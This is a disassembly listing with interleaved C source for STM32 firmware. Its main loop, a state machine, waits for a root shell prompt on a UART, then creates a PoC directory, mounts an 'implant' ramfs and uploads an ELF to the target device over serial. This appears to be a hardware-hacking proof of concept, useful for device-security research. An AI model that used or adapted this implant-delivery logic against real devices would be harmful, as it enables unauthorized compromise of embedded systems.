  HAL_UART_Transmit(&huart1, (uint8_t *)&exec_cmd, sizeof(exec_cmd) - 1, 1000);
  HAL_Delay(500);

  return 0;
}
 80014ba:	2001      	movs	r0, #1
 80014bc:	b02c      	add	sp, #176	; 0xb0
 80014be:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
    HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
 80014c2:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80014c6:	2245      	movs	r2, #69	; 0x45
 80014c8:	a91a      	add	r1, sp, #104	; 0x68
 80014ca:	4640      	mov	r0, r8
 80014cc:	f7ff fcca 	bl	8000e64 <HAL_UART_Transmit>
    HAL_Delay(500);
 80014d0:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 80014d4:	f7fe fe82 	bl	80001dc <HAL_Delay>
    if (idx % 80 == 0)
 80014d8:	2250      	movs	r2, #80	; 0x50
 80014da:	fbb5 f3f2 	udiv	r3, r5, r2
 80014de:	fb02 5313 	mls	r3, r2, r3, r5
 80014e2:	b91b      	cbnz	r3, 80014ec <upload_elf+0x84>
      HAL_Delay(500);
 80014e4:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 80014e8:	f7fe fe78 	bl	80001dc <HAL_Delay>
 80014ec:	3408      	adds	r4, #8
 80014ee:	e7c3      	b.n	8001478 <upload_elf+0x10>
 80014f0:	20000008 	.word	0x20000008
 80014f4:	08002433 	.word	0x08002433
 80014f8:	20001a50 	.word	0x20001a50

080014fc <main>:
{
 80014fc:	b5f0      	push	{r4, r5, r6, r7, lr}
 80014fe:	b091      	sub	sp, #68	; 0x44
  HAL_Init();
 8001500:	f7fe fe48 	bl	8000194 <HAL_Init>
  SystemClock_Config();
 8001504:	f7ff fe84 	bl	8001210 <SystemClock_Config>
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8001508:	4b8e      	ldr	r3, [pc, #568]	; (8001744 <main+0x248>)
  HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 0, 0);
 800150a:	200e      	movs	r0, #14
  __HAL_RCC_GPIOA_CLK_ENABLE();
 800150c:	699a      	ldr	r2, [r3, #24]
  huart1.Init.BaudRate = 115200;
 800150e:	f44f 34e1 	mov.w	r4, #115200	; 0x1c200
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8001512:	f042 0204 	orr.w	r2, r2, #4
 8001516:	619a      	str	r2, [r3, #24]
 8001518:	699a      	ldr	r2, [r3, #24]
    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 800151a:	4d8b      	ldr	r5, [pc, #556]	; (8001748 <main+0x24c>)
  __HAL_RCC_GPIOA_CLK_ENABLE();
 800151c:	f002 0204 	and.w	r2, r2, #4
 8001520:	9201      	str	r2, [sp, #4]
 8001522:	9a01      	ldr	r2, [sp, #4]
  __HAL_RCC_DMA1_CLK_ENABLE();
 8001524:	695a      	ldr	r2, [r3, #20]
 8001526:	f042 0201 	orr.w	r2, r2, #1
 800152a:	615a      	str	r2, [r3, #20]
  HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 0, 0);
 800152c:	2200      	movs	r2, #0
  __HAL_RCC_DMA1_CLK_ENABLE();
 800152e:	695b      	ldr	r3, [r3, #20]
  HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 0, 0);
 8001530:	4611      	mov	r1, r2
  __HAL_RCC_DMA1_CLK_ENABLE();
 8001532:	f003 0301 	and.w	r3, r3, #1
 8001536:	9300      	str	r3, [sp, #0]
 8001538:	9b00      	ldr	r3, [sp, #0]
  HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 0, 0);
 800153a:	f7fe fe73 	bl	8000224 <HAL_NVIC_SetPriority>
  HAL_NVIC_EnableIRQ(DMA1_Channel4_IRQn);
 800153e:	200e      	movs	r0, #14
 8001540:	f7fe fea4 	bl	800028c <HAL_NVIC_EnableIRQ>
  HAL_NVIC_SetPriority(DMA1_Channel5_IRQn, 0, 0);
 8001544:	2200      	movs	r2, #0
 8001546:	200f      	movs	r0, #15
 8001548:	4611      	mov	r1, r2
 800154a:	f7fe fe6b 	bl	8000224 <HAL_NVIC_SetPriority>
  HAL_NVIC_EnableIRQ(DMA1_Channel5_IRQn);
 800154e:	200f      	movs	r0, #15
 8001550:	f7fe fe9c 	bl	800028c <HAL_NVIC_EnableIRQ>
  huart1.Instance = USART1;
 8001554:	487d      	ldr	r0, [pc, #500]	; (800174c <main+0x250>)
  huart1.Init.BaudRate = 115200;
 8001556:	4b7e      	ldr	r3, [pc, #504]	; (8001750 <main+0x254>)
  huart1.Init.Mode = UART_MODE_TX_RX;
 8001558:	220c      	movs	r2, #12
  huart1.Init.BaudRate = 115200;
 800155a:	e880 0018 	stmia.w	r0, {r3, r4}
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
 800155e:	2300      	movs	r3, #0
  huart1.Init.Mode = UART_MODE_TX_RX;
 8001560:	6142      	str	r2, [r0, #20]
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
 8001562:	6083      	str	r3, [r0, #8]
  huart1.Init.StopBits = UART_STOPBITS_1;
 8001564:	60c3      	str	r3, [r0, #12]
  huart1.Init.Parity = UART_PARITY_NONE;
 8001566:	6103      	str	r3, [r0, #16]
  huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8001568:	6183      	str	r3, [r0, #24]
  huart1.Init.OverSampling = UART_OVERSAMPLING_16;
 800156a:	61c3      	str	r3, [r0, #28]
  if (HAL_UART_Init(&huart1) != HAL_OK)
 800156c:	2419      	movs	r4, #25
 800156e:	f7ff fc4b 	bl	8000e08 <HAL_UART_Init>
    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 8001572:	f44f 5100 	mov.w	r1, #8192	; 0x2000
 8001576:	4628      	mov	r0, r5
 8001578:	f7ff f8d4 	bl	8000724 <HAL_GPIO_TogglePin>
 800157c:	3c01      	subs	r4, #1
    HAL_Delay(1000);
 800157e:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8001582:	f7fe fe2b 	bl	80001dc <HAL_Delay>
  for (uint8_t i = 0; i < 25; i++)
 8001586:	f014 04ff 	ands.w	r4, r4, #255	; 0xff
 800158a:	d1f2      	bne.n	8001572 <main+0x76>
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 800158c:	4d6f      	ldr	r5, [pc, #444]	; (800174c <main+0x250>)
	    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 800158e:	4e6e      	ldr	r6, [pc, #440]	; (8001748 <main+0x24c>)
	    if (state == STATE_INITIAL)
 8001590:	2c00      	cmp	r4, #0
 8001592:	d13a      	bne.n	800160a <main+0x10e>
	      if (is_root_shell_prompt_present() == 1)
 8001594:	f7ff fe92 	bl	80012bc <is_root_shell_prompt_present>
 8001598:	2801      	cmp	r0, #1
 800159a:	d129      	bne.n	80015f0 <main+0xf4>
	        char msg[] = "# Changing state to STATE_PROMPT_SHELL_DETECTED.\r\n";
 800159c:	aa02      	add	r2, sp, #8
 800159e:	4617      	mov	r7, r2
 80015a0:	4b6c      	ldr	r3, [pc, #432]	; (8001754 <main+0x258>)
 80015a2:	f103 0e30 	add.w	lr, r3, #48	; 0x30
 80015a6:	4614      	mov	r4, r2
 80015a8:	6818      	ldr	r0, [r3, #0]
 80015aa:	6859      	ldr	r1, [r3, #4]
 80015ac:	3308      	adds	r3, #8
 80015ae:	c403      	stmia	r4!, {r0, r1}
 80015b0:	4573      	cmp	r3, lr
 80015b2:	4622      	mov	r2, r4
 80015b4:	d1f7      	bne.n	80015a6 <main+0xaa>
 80015b6:	8819      	ldrh	r1, [r3, #0]
 80015b8:	789b      	ldrb	r3, [r3, #2]
 80015ba:	8021      	strh	r1, [r4, #0]
 80015bc:	70a3      	strb	r3, [r4, #2]
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 80015be:	2232      	movs	r2, #50	; 0x32
 80015c0:	2364      	movs	r3, #100	; 0x64
 80015c2:	4639      	mov	r1, r7
 80015c4:	4628      	mov	r0, r5
 80015c6:	f7ff fc4d 	bl	8000e64 <HAL_UART_Transmit>
	        HAL_Delay(500);
 80015ca:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 80015ce:	f7fe fe05 	bl	80001dc <HAL_Delay>
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
 80015d2:	2264      	movs	r2, #100	; 0x64
 80015d4:	2100      	movs	r1, #0
 80015d6:	4860      	ldr	r0, [pc, #384]	; (8001758 <main+0x25c>)
 80015d8:	f000 fa19 	bl	8001a0e <memset>
	        state = STATE_PROMPT_SHELL_DETECTED;
 80015dc:	2401      	movs	r4, #1
	    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 80015de:	4630      	mov	r0, r6
 80015e0:	f44f 5100 	mov.w	r1, #8192	; 0x2000
 80015e4:	f7ff f89e 	bl	8000724 <HAL_GPIO_TogglePin>
	    HAL_Delay(100);
 80015e8:	2064      	movs	r0, #100	; 0x64
 80015ea:	f7fe fdf7 	bl	80001dc <HAL_Delay>
	    if (state == STATE_INITIAL)
 80015ee:	e7cf      	b.n	8001590 <main+0x94>
	        g_rx_buff_size = CMD_SHELL_RX_BUFF_SIZE;
 80015f0:	2208      	movs	r2, #8
 80015f2:	4b5a      	ldr	r3, [pc, #360]	; (800175c <main+0x260>)
	        HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 80015f4:	4958      	ldr	r1, [pc, #352]	; (8001758 <main+0x25c>)
 80015f6:	4628      	mov	r0, r5
	        g_rx_buff_size = CMD_SHELL_RX_BUFF_SIZE;
 80015f8:	701a      	strb	r2, [r3, #0]
	        HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
 80015fa:	f7ff fc8f 	bl	8000f1c <HAL_UART_Receive_DMA>
	        transmit_carriage_return_and_newline();
 80015fe:	f7ff fe63 	bl	80012c8 <transmit_carriage_return_and_newline>
	        HAL_Delay(100);
 8001602:	2064      	movs	r0, #100	; 0x64
 8001604:	f7fe fdea 	bl	80001dc <HAL_Delay>
 8001608:	e7e9      	b.n	80015de <main+0xe2>
	    else if (state == STATE_PROMPT_SHELL_DETECTED)
 800160a:	2c01      	cmp	r4, #1
 800160c:	d121      	bne.n	8001652 <main+0x156>
	      if (set_current_working_directory() == 0)
 800160e:	f7ff fe71 	bl	80012f4 <set_current_working_directory>
 8001612:	2800      	cmp	r0, #0
 8001614:	d1e3      	bne.n	80015de <main+0xe2>
	        char msg[] = "# Changing state to STATE_CWD_TO_VAR.\r\n";
 8001616:	aa02      	add	r2, sp, #8
 8001618:	4617      	mov	r7, r2
 800161a:	4b51      	ldr	r3, [pc, #324]	; (8001760 <main+0x264>)
 800161c:	f103 0e28 	add.w	lr, r3, #40	; 0x28
 8001620:	4614      	mov	r4, r2
 8001622:	6818      	ldr	r0, [r3, #0]
 8001624:	6859      	ldr	r1, [r3, #4]
 8001626:	3308      	adds	r3, #8
 8001628:	c403      	stmia	r4!, {r0, r1}
 800162a:	4573      	cmp	r3, lr
 800162c:	4622      	mov	r2, r4
 800162e:	d1f7      	bne.n	8001620 <main+0x124>
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 8001630:	2364      	movs	r3, #100	; 0x64
 8001632:	2227      	movs	r2, #39	; 0x27
 8001634:	4639      	mov	r1, r7
 8001636:	4628      	mov	r0, r5
 8001638:	f7ff fc14 	bl	8000e64 <HAL_UART_Transmit>
	        HAL_Delay(500);
 800163c:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8001640:	f7fe fdcc 	bl	80001dc <HAL_Delay>
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
 8001644:	2264      	movs	r2, #100	; 0x64
 8001646:	2100      	movs	r1, #0
 8001648:	4843      	ldr	r0, [pc, #268]	; (8001758 <main+0x25c>)
 800164a:	f000 f9e0 	bl	8001a0e <memset>
	        state = STATE_CWD_TO_VAR;
 800164e:	2402      	movs	r4, #2
 8001650:	e7c5      	b.n	80015de <main+0xe2>
	    else if (state == STATE_CWD_TO_VAR)
 8001652:	2c02      	cmp	r4, #2
 8001654:	d125      	bne.n	80016a2 <main+0x1a6>
	      if (create_poc_directory() == 0)
 8001656:	f7ff fe8d 	bl	8001374 <create_poc_directory>
 800165a:	2800      	cmp	r0, #0
 800165c:	d1bf      	bne.n	80015de <main+0xe2>
	        char msg[] = "# Changing state to STATE_POC_RW_DIRECTORY_CREATED.\r\n";
 800165e:	aa02      	add	r2, sp, #8
 8001660:	4617      	mov	r7, r2
 8001662:	4b40      	ldr	r3, [pc, #256]	; (8001764 <main+0x268>)
 8001664:	f103 0e30 	add.w	lr, r3, #48	; 0x30
 8001668:	4614      	mov	r4, r2
 800166a:	6818      	ldr	r0, [r3, #0]
 800166c:	6859      	ldr	r1, [r3, #4]
 800166e:	3308      	adds	r3, #8
 8001670:	c403      	stmia	r4!, {r0, r1}
 8001672:	4573      	cmp	r3, lr
 8001674:	4622      	mov	r2, r4
 8001676:	d1f7      	bne.n	8001668 <main+0x16c>
 8001678:	6818      	ldr	r0, [r3, #0]
 800167a:	889b      	ldrh	r3, [r3, #4]
 800167c:	6020      	str	r0, [r4, #0]
 800167e:	80a3      	strh	r3, [r4, #4]
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 8001680:	2235      	movs	r2, #53	; 0x35
 8001682:	2364      	movs	r3, #100	; 0x64
 8001684:	4639      	mov	r1, r7
 8001686:	4628      	mov	r0, r5
 8001688:	f7ff fbec 	bl	8000e64 <HAL_UART_Transmit>
	        HAL_Delay(500);
 800168c:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8001690:	f7fe fda4 	bl	80001dc <HAL_Delay>
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
 8001694:	2264      	movs	r2, #100	; 0x64
 8001696:	2100      	movs	r1, #0
 8001698:	482f      	ldr	r0, [pc, #188]	; (8001758 <main+0x25c>)
 800169a:	f000 f9b8 	bl	8001a0e <memset>
	        state = STATE_POC_RW_DIRECTORY_CREATED;
 800169e:	2403      	movs	r4, #3
 80016a0:	e79d      	b.n	80015de <main+0xe2>
	    else if (state == STATE_POC_RW_DIRECTORY_CREATED)
 80016a2:	2c03      	cmp	r4, #3
 80016a4:	d126      	bne.n	80016f4 <main+0x1f8>
	        if (mount_implant_ramfs() == 0)
 80016a6:	f7ff fea5 	bl	80013f4 <mount_implant_ramfs>
 80016aa:	b108      	cbz	r0, 80016b0 <main+0x1b4>
	          state = STATE_FAIL;
 80016ac:	2407      	movs	r4, #7
 80016ae:	e796      	b.n	80015de <main+0xe2>
	          char msg[] = "# Changing state to STATE_IMPLANT_RAMFS_MOUNTED.\r\n";
 80016b0:	aa02      	add	r2, sp, #8
 80016b2:	4617      	mov	r7, r2
 80016b4:	4b2c      	ldr	r3, [pc, #176]	; (8001768 <main+0x26c>)
 80016b6:	f103 0e30 	add.w	lr, r3, #48	; 0x30
 80016ba:	4614      	mov	r4, r2
 80016bc:	6818      	ldr	r0, [r3, #0]
 80016be:	6859      	ldr	r1, [r3, #4]
 80016c0:	3308      	adds	r3, #8
 80016c2:	c403      	stmia	r4!, {r0, r1}
 80016c4:	4573      	cmp	r3, lr
 80016c6:	4622      	mov	r2, r4
 80016c8:	d1f7      	bne.n	80016ba <main+0x1be>
 80016ca:	8819      	ldrh	r1, [r3, #0]
 80016cc:	789b      	ldrb	r3, [r3, #2]
 80016ce:	8021      	strh	r1, [r4, #0]
 80016d0:	70a3      	strb	r3, [r4, #2]
	          HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 80016d2:	2232      	movs	r2, #50	; 0x32
 80016d4:	2364      	movs	r3, #100	; 0x64
 80016d6:	4639      	mov	r1, r7
 80016d8:	4628      	mov	r0, r5
 80016da:	f7ff fbc3 	bl	8000e64 <HAL_UART_Transmit>
	          HAL_Delay(500);
 80016de:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 80016e2:	f7fe fd7b 	bl	80001dc <HAL_Delay>
	          memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
 80016e6:	2264      	movs	r2, #100	; 0x64
 80016e8:	2100      	movs	r1, #0
 80016ea:	481b      	ldr	r0, [pc, #108]	; (8001758 <main+0x25c>)
 80016ec:	f000 f98f 	bl	8001a0e <memset>
	          state = STATE_IMPLANT_RAMFS_MOUNTED;
 80016f0:	2404      	movs	r4, #4
 80016f2:	e774      	b.n	80015de <main+0xe2>
	    else if (state == STATE_IMPLANT_RAMFS_MOUNTED)
 80016f4:	2c04      	cmp	r4, #4
 80016f6:	f47f af72 	bne.w	80015de <main+0xe2>
	      if (upload_elf() == 0)
 80016fa:	f7ff feb5 	bl	8001468 <upload_elf>
 80016fe:	2800      	cmp	r0, #0
 8001700:	d1d4      	bne.n	80016ac <main+0x1b0>
	        char msg[] = "# Changing state to STATE_ELF_UPLOADED.\r\n";
 8001702:	aa02      	add	r2, sp, #8
 8001704:	4617      	mov	r7, r2
 8001706:	4b19      	ldr	r3, [pc, #100]	; (800176c <main+0x270>)
 8001708:	f103 0e28 	add.w	lr, r3, #40	; 0x28
 800170c:	4614      	mov	r4, r2
 800170e:	6818      	ldr	r0, [r3, #0]
 8001710:	6859      	ldr	r1, [r3, #4]
 8001712:	3308      	adds	r3, #8
 8001714:	c403      	stmia	r4!, {r0, r1}
 8001716:	4573      	cmp	r3, lr
 8001718:	4622      	mov	r2, r4
 800171a:	d1f7      	bne.n	800170c <main+0x210>
 800171c:	881b      	ldrh	r3, [r3, #0]
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 800171e:	2229      	movs	r2, #41	; 0x29
	        char msg[] = "# Changing state to STATE_ELF_UPLOADED.\r\n";
 8001720:	8023      	strh	r3, [r4, #0]
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
 8001722:	4639      	mov	r1, r7
 8001724:	2364      	movs	r3, #100	; 0x64
 8001726:	4628      	mov	r0, r5
 8001728:	f7ff fb9c 	bl	8000e64 <HAL_UART_Transmit>
	        HAL_Delay(500);
 800172c:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 8001730:	f7fe fd54 	bl	80001dc <HAL_Delay>
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
 8001734:	2264      	movs	r2, #100	; 0x64
 8001736:	2100      	movs	r1, #0
 8001738:	4807      	ldr	r0, [pc, #28]	; (8001758 <main+0x25c>)
 800173a:	f000 f968 	bl	8001a0e <memset>
	        state = STATE_ELF_UPLOADED;
 800173e:	2405      	movs	r4, #5
 8001740:	e74d      	b.n	80015de <main+0xe2>
 8001742:	bf00      	nop
 8001744:	40021000 	.word	0x40021000
 8001748:	40011000 	.word	0x40011000
 800174c:	20001a50 	.word	0x20001a50
 8001750:	40013800 	.word	0x40013800
 8001754:	080022fb 	.word	0x080022fb
 8001758:	20001900 	.word	0x20001900
 800175c:	20001a90 	.word	0x20001a90
 8001760:	0800232e 	.word	0x0800232e
 8001764:	08002356 	.word	0x08002356
 8001768:	0800238c 	.word	0x0800238c
 800176c:	080023bf 	.word	0x080023bf

08001770 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8001770:	4770      	bx	lr
	...

08001774 <HAL_MspInit>:
{
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_AFIO_CLK_ENABLE();
 8001774:	4b0e      	ldr	r3, [pc, #56]	; (80017b0 <HAL_MspInit+0x3c>)
{
 8001776:	b082      	sub	sp, #8
  __HAL_RCC_AFIO_CLK_ENABLE();
 8001778:	699a      	ldr	r2, [r3, #24]
 800177a:	f042 0201 	orr.w	r2, r2, #1
 800177e:	619a      	str	r2, [r3, #24]
 8001780:	699a      	ldr	r2, [r3, #24]
 8001782:	f002 0201 	and.w	r2, r2, #1
 8001786:	9200      	str	r2, [sp, #0]
 8001788:	9a00      	ldr	r2, [sp, #0]
  __HAL_RCC_PWR_CLK_ENABLE();
 800178a:	69da      	ldr	r2, [r3, #28]
 800178c:	f042 5280 	orr.w	r2, r2, #268435456	; 0x10000000
 8001790:	61da      	str	r2, [r3, #28]
 8001792:	69db      	ldr	r3, [r3, #28]

  /* System interrupt init*/

  /** NOJTAG: JTAG-DP Disabled and SW-DP Enabled 
  */
  __HAL_AFIO_REMAP_SWJ_NOJTAG();
 8001794:	4a07      	ldr	r2, [pc, #28]	; (80017b4 <HAL_MspInit+0x40>)
  __HAL_RCC_PWR_CLK_ENABLE();
 8001796:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800179a:	9301      	str	r3, [sp, #4]
 800179c:	9b01      	ldr	r3, [sp, #4]
  __HAL_AFIO_REMAP_SWJ_NOJTAG();
 800179e:	6853      	ldr	r3, [r2, #4]
 80017a0:	f023 63e0 	bic.w	r3, r3, #117440512	; 0x7000000
 80017a4:	f043 7300 	orr.w	r3, r3, #33554432	; 0x2000000
 80017a8:	6053      	str	r3, [r2, #4]

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 80017aa:	b002      	add	sp, #8
 80017ac:	4770      	bx	lr
 80017ae:	bf00      	nop
 80017b0:	40021000 	.word	0x40021000
 80017b4:	40010000 	.word	0x40010000

080017b8 <HAL_UART_MspInit>:
* This function configures the hardware resources used in this example
* @param huart: UART handle pointer
* @retval None
*/
void HAL_UART_MspInit(UART_HandleTypeDef* huart)
{
 80017b8:	b570      	push	{r4, r5, r6, lr}
 80017ba:	4606      	mov	r6, r0
 80017bc:	b086      	sub	sp, #24
  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80017be:	2210      	movs	r2, #16
 80017c0:	2100      	movs	r1, #0
 80017c2:	a802      	add	r0, sp, #8
 80017c4:	f000 f923 	bl	8001a0e <memset>
  if(huart->Instance==USART1)
 80017c8:	6832      	ldr	r2, [r6, #0]
 80017ca:	4b2f      	ldr	r3, [pc, #188]	; (8001888 <HAL_UART_MspInit+0xd0>)
 80017cc:	429a      	cmp	r2, r3
 80017ce:	d159      	bne.n	8001884 <HAL_UART_MspInit+0xcc>
  {
  /* USER CODE BEGIN USART1_MspInit 0 */

  /* USER CODE END USART1_MspInit 0 */
    /* Peripheral clock enable */
    __HAL_RCC_USART1_CLK_ENABLE();
 80017d0:	f503 4358 	add.w	r3, r3, #55296	; 0xd800
 80017d4:	699a      	ldr	r2, [r3, #24]
    PA10     ------> USART1_RX 
    */
    GPIO_InitStruct.Pin = GPIO_PIN_9;
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 80017d6:	a902      	add	r1, sp, #8
    __HAL_RCC_USART1_CLK_ENABLE();
 80017d8:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 80017dc:	619a      	str	r2, [r3, #24]
 80017de:	699a      	ldr	r2, [r3, #24]
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 80017e0:	482a      	ldr	r0, [pc, #168]	; (800188c <HAL_UART_MspInit+0xd4>)
    __HAL_RCC_USART1_CLK_ENABLE();
 80017e2:	f402 4280 	and.w	r2, r2, #16384	; 0x4000
 80017e6:	9200      	str	r2, [sp, #0]
 80017e8:	9a00      	ldr	r2, [sp, #0]
    __HAL_RCC_GPIOA_CLK_ENABLE();
 80017ea:	699a      	ldr	r2, [r3, #24]

    GPIO_InitStruct.Pin = GPIO_PIN_10;
    GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
 80017ec:	2500      	movs	r5, #0
    __HAL_RCC_GPIOA_CLK_ENABLE();
 80017ee:	f042 0204 	orr.w	r2, r2, #4
 80017f2:	619a      	str	r2, [r3, #24]
 80017f4:	699b      	ldr	r3, [r3, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);

    /* USART1 DMA Init */
    /* USART1_RX Init */
    hdma_usart1_rx.Instance = DMA1_Channel5;
 80017f6:	4c26      	ldr	r4, [pc, #152]	; (8001890 <HAL_UART_MspInit+0xd8>)
    __HAL_RCC_GPIOA_CLK_ENABLE();
 80017f8:	f003 0304 	and.w	r3, r3, #4
 80017fc:	9301      	str	r3, [sp, #4]
 80017fe:	9b01      	ldr	r3, [sp, #4]
    GPIO_InitStruct.Pin = GPIO_PIN_9;
 8001800:	f44f 7300 	mov.w	r3, #512	; 0x200
 8001804:	9302      	str	r3, [sp, #8]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001806:	2302      	movs	r3, #2
 8001808:	9303      	str	r3, [sp, #12]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
 800180a:	2303      	movs	r3, #3
 800180c:	9305      	str	r3, [sp, #20]
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 800180e:	f7fe fea9 	bl	8000564 <HAL_GPIO_Init>
    GPIO_InitStruct.Pin = GPIO_PIN_10;
 8001812:	f44f 6380 	mov.w	r3, #1024	; 0x400
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8001816:	481d      	ldr	r0, [pc, #116]	; (800188c <HAL_UART_MspInit+0xd4>)
 8001818:	a902      	add	r1, sp, #8
    GPIO_InitStruct.Pin = GPIO_PIN_10;
 800181a:	9302      	str	r3, [sp, #8]
    GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
 800181c:	9503      	str	r5, [sp, #12]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 800181e:	9504      	str	r5, [sp, #16]
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8001820:	f7fe fea0 	bl	8000564 <HAL_GPIO_Init>
    hdma_usart1_rx.Instance = DMA1_Channel5;
 8001824:	4b1b      	ldr	r3, [pc, #108]	; (8001894 <HAL_UART_MspInit+0xdc>)
    hdma_usart1_rx.Init.MemInc = DMA_MINC_ENABLE;
    hdma_usart1_rx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
    hdma_usart1_rx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
    hdma_usart1_rx.Init.Mode = DMA_NORMAL;
    hdma_usart1_rx.Init.Priority = DMA_PRIORITY_LOW;
    if (HAL_DMA_Init(&hdma_usart1_rx) != HAL_OK)
 8001826:	4620      	mov	r0, r4
    hdma_usart1_rx.Init.Direction = DMA_PERIPH_TO_MEMORY;
 8001828:	e884 0028 	stmia.w	r4, {r3, r5}
    hdma_usart1_rx.Init.MemInc = DMA_MINC_ENABLE;
 800182c:	2380      	movs	r3, #128	; 0x80
    hdma_usart1_rx.Init.PeriphInc = DMA_PINC_DISABLE;
 800182e:	60a5      	str	r5, [r4, #8]
    hdma_usart1_rx.Init.MemInc = DMA_MINC_ENABLE;
 8001830:	60e3      	str	r3, [r4, #12]
    hdma_usart1_rx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
 8001832:	6125      	str	r5, [r4, #16]
    hdma_usart1_rx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
 8001834:	6165      	str	r5, [r4, #20]
    hdma_usart1_rx.Init.Mode = DMA_NORMAL;
 8001836:	61a5      	str	r5, [r4, #24]
    hdma_usart1_rx.Init.Priority = DMA_PRIORITY_LOW;
 8001838:	61e5      	str	r5, [r4, #28]
    if (HAL_DMA_Init(&hdma_usart1_rx) != HAL_OK)
 800183a:	f7fe fd49 	bl	80002d0 <HAL_DMA_Init>
 800183e:	b108      	cbz	r0, 8001844 <HAL_UART_MspInit+0x8c>
    {
      Error_Handler();
 8001840:	f7ff ff96 	bl	8001770 <Error_Handler>

    __HAL_LINKDMA(huart,hdmarx,hdma_usart1_rx);

    /* USART1_TX Init */
    hdma_usart1_tx.Instance = DMA1_Channel4;
    hdma_usart1_tx.Init.Direction = DMA_MEMORY_TO_PERIPH;
 8001844:	f04f 0c10 	mov.w	ip, #16
 8001848:	4b13      	ldr	r3, [pc, #76]	; (8001898 <HAL_UART_MspInit+0xe0>)
    __HAL_LINKDMA(huart,hdmarx,hdma_usart1_rx);
 800184a:	6374      	str	r4, [r6, #52]	; 0x34
 800184c:	6266      	str	r6, [r4, #36]	; 0x24
    hdma_usart1_tx.Instance = DMA1_Channel4;
 800184e:	4c13      	ldr	r4, [pc, #76]	; (800189c <HAL_UART_MspInit+0xe4>)
    hdma_usart1_tx.Init.PeriphInc = DMA_PINC_DISABLE;
    hdma_usart1_tx.Init.MemInc = DMA_MINC_ENABLE;
 8001850:	2280      	movs	r2, #128	; 0x80
    hdma_usart1_tx.Init.Direction = DMA_MEMORY_TO_PERIPH;
 8001852:	e884 1008 	stmia.w	r4, {r3, ip}
    hdma_usart1_tx.Init.PeriphInc = DMA_PINC_DISABLE;
 8001856:	2300      	movs	r3, #0
    hdma_usart1_tx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
    hdma_usart1_tx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
    hdma_usart1_tx.Init.Mode = DMA_NORMAL;
    hdma_usart1_tx.Init.Priority = DMA_PRIORITY_LOW;
    if (HAL_DMA_Init(&hdma_usart1_tx) != HAL_OK)
 8001858:	4620      	mov	r0, r4
    hdma_usart1_tx.Init.PeriphInc = DMA_PINC_DISABLE;
 800185a:	60a3      	str	r3, [r4, #8]
    hdma_usart1_tx.Init.MemInc = DMA_MINC_ENABLE;
 800185c:	60e2      	str	r2, [r4, #12]
